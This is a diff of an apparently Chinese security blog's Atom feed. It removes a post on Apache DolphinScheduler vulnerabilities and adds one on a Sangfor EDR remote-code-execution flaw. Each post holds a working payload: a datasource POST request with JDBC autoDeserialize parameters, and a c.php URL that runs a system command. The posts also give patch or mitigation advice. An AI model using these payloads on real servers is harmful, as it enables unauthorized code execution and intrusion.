@@ -174,32 +174,6 @@
   </entry>
   
   <entry>
-    <title>两个Apache DolphinScheduler高危漏洞</title>
-    <link href="https://yejinpoxiao.xyz/2020/09/18/%E4%B8%A4%E4%B8%AAApache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/"/>
-    <id>https://yejinpoxiao.xyz/2020/09/18/%E4%B8%A4%E4%B8%AAApache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/</id>
-    <published>2020-09-18T01:46:10.895Z</published>
-    <updated>2020-09-18T02:02:03.836Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p><h2 id="一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"><a href="#一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）" class="headerlink" title="一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"></a>一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）</h2><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>该漏洞导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache DolphinScheduler    1.2.0</p><p>Apache DolphinScheduler    1.2.1</p><p>Apache DolphinScheduler    1.3.1</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p><p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dolphinscheduler/datasources/connect</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;</span><br><span class="line"></span><br><span class="line">principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;</span><br><span class="line"></span><br><span class="line">other=&#123;"detectCustomCollations":true,"autoDeserialize":true&#125;</span><br></pre></td></tr></table></figure><h2 id="二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"><a href="#二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）" class="headerlink" title="二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"></a>二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）</h2><h3 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h3><p>该漏洞与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc  connect参数输入{“detectCustomCollations”:true,”autoDeserialize”:true}在DolphinScheduler 服务器上远程执行代码。</p><h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache DolphinScheduler  1.2.0</p><p>Apache DolphinScheduler  1.2.1</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>尽快升级版本至1.3.2进行防护，官方下载链接：</p><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html" target="_blank" rel="noopener">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调
-      
-    
-    </summary>
-    
-    
-      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
-    
-    
-      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Exchange Server 远程代码执行漏洞(CVE-2020-16875)</title>
     <link href="https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/"/>
     <id>https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/</id>
@@ -537,6 +511,32 @@
     
     
       <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>深x服EDR终端检测平台RCE漏洞</title>
+    <link href="https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-08-17T15:02:48.856Z</published>
+    <updated>2020-08-23T15:12:42.343Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p><h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>现阶段深x服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
+    
+    
+      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     
   </entry>
   
